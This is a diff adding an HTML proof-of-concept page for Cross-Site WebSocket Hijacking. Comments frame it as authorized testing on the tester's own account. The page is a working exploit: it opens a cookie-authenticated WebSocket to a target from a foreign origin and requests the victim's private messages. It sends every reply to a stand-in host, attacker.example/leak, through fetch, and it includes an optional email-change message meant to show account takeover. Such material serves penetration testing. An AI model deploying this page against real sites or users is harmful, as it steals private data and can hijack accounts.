@@ -1,0 +1,48 @@
+<!doctype html>
+<!--
+  cswsh_poc.html — Cross-Site WebSocket Hijacking proof-of-concept (BENIGN).
+
+  Authorized testing only. Host this on an origin you control (NOT the target), e.g.
+  https://attacker.example/cswsh_poc.html, then open it in the SAME browser where YOUR OWN
+  VICTIM TEST ACCOUNT is logged into the target. If the target's WS authenticates by cookie and
+  does NOT validate the Origin header, this page connects AS THE VICTIM (the browser auto-attaches
+  the cookie) and can read the replies — that's CSWSH (CSRF that can also read responses), guide §5/§9.
+
+  This PoC only: (1) reads one "give me my data" message and shows/exfils it to YOUR server,
+  and (2) optionally fires a benign state change to a marker value. Use your own victim account.
+  Do NOT point it at a real user. Revert any state change afterward.
+-->
+<meta charset="utf-8">
+<title>CSWSH PoC</title>
+<pre id="log">CSWSH PoC — connecting…
+</pre>
+<script>
+  // ---- configure these for your authorized test ----
+  var TARGET   = "wss://target.com/ws";                      // the victim WS endpoint
+  var READ_MSG = '{"type":"getMessages"}';                   // a message that returns the victim's private data
+  var EXFIL    = "https://attacker.example/leak";            // YOUR server (collects the proof)
+  var DO_STATE_CHANGE = false;                               // set true only to demo ATO on YOUR victim account
+  var STATE_MSG = '{"type":"updateEmail","email":"attacker+ws@your-inbox.test"}';  // benign marker change
+  // ---------------------------------------------------
+
+  var log = document.getElementById("log");
+  function out(s){ log.textContent += s + "\n"; }
+
+  try {
+    var ws = new WebSocket(TARGET);    // cookies for TARGET's host are attached automatically by the browser
+    ws.onopen = function () {
+      out("[+] connected cross-origin (handshake accepted with this page's Origin) → CSWSH viable");
+      ws.send(READ_MSG);
+      if (DO_STATE_CHANGE) { ws.send(STATE_MSG); out("[+] sent benign state-change (marker)"); }
+    };
+    ws.onmessage = function (e) {
+      out("[<] " + e.data);
+      // exfiltrate the victim's data to YOUR server as the proof (no third parties):
+      try { fetch(EXFIL + "?d=" + encodeURIComponent(e.data), { mode: "no-cors" }); } catch (_) {}
+    };
+    ws.onerror = function () { out("[!] error / blocked — Origin may be validated, or auth is a token (not a cookie) → likely NOT CSWSH"); };
+    ws.onclose = function (ev) { out("[x] closed (code " + ev.code + ")"); };
+  } catch (err) {
+    out("[!] " + err);
+  }
+</script>
